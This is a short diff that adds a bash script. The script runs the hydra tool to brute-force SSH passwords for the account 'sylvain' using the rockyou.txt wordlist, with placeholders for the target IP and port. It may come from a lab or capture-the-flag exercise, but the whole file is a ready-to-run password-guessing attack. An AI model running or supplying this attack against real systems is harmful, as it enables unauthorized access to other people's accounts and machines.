@@ -1,0 +1,2 @@
+#!/usr/bin/env bash
+hydra -l sylvain -P ./rockyou.txt -s <port> ssh://<IP> -V
